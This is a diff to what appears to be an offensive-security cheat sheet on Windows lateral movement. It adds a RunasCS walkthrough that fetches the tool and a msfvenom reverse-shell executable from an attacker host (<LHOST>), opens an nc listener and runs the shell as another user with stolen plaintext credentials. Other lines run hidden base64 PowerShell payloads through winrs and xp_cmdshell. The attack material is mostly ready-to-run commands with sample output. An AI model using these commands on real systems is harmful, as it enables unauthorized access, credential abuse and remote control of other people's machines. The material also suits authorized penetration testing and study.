@@ -28,6 +28,8 @@ Use valid creds/hash/tickets to reach more hosts, dump more creds, and move towa
 
 ### WinRM
 
+Prefer WinRM when it is enabled because it gives a clean interactive shell and file transfer options.
+
 ### WinRM With Evil-WinRM
 
 #Username #Password #Windows #ActiveDirectory #LateralMovement
@@ -59,10 +61,13 @@ menu
 Use native PowerShell remoting with a credential object.
 
 ```powershell
+# Build a PSCredential object.
 $username = '<USER>'
 $password = '<PASS>'
 $secureString = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString
+
+# Create and enter the remote session.
 New-PSSession -ComputerName <TARGET_HOST> -Credential $credential
 Enter-PSSession 1
 ```
@@ -81,6 +86,42 @@ winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "cmd /c hostname & whoami"
 
 # Execute an encoded PowerShell payload over WinRS.
 winrs -r:<TARGET_HOST> -u:<USER> -p:<PASS> "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
+```
+
+### RunasCS Spawn Process As Another User
+
+#Username #Password #PowerShell #Windows #ActiveDirectory #LateralMovement
+Use RunasCS when you have another user's plaintext credentials and want to spawn a command or reverse shell as that user from an existing Windows shell.
+
+```powershell
+# Attacker reference:
+# https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1
+
+# Target: download and load RunasCS.
+iwr http://<LHOST>/Invoke-RunasCs.ps1 -outfile Invoke-RunasCs.ps1
+. ./Invoke-RunasCs.ps1
+
+# Target: test command execution as the other user.
+Invoke-RunasCs -Username <USER> -Password '<PASS>' -Command "whoami"
+# Example output:
+# access\svc_mssql
+
+# Attacker: generate a Windows reverse-shell payload.
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
+
+# Target: download the payload.
+iwr http://<LHOST>/shell.exe -o shell.exe
+
+# Attacker: start listener before triggering.
+nc -lvnp <LPORT>
+
+# Target: spawn the payload as the other user.
+Invoke-RunasCs -Username <USER> -Password '<PASS>' -Command "C:\users\public\shell.exe"
+
+# Attacker shell: confirm callback identity.
+whoami
+# Example output:
+# access\svc_mssql
 ```
 
 ### SMB Remote Execution
@@ -218,6 +259,8 @@ EXECUTE xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
 ```
 
 ### Subnet Reuse / Admin Checks
+
+After finding one valid credential/hash, sweep nearby hosts for local admin reuse.
 
 ### Subnet Reuse With Password
 
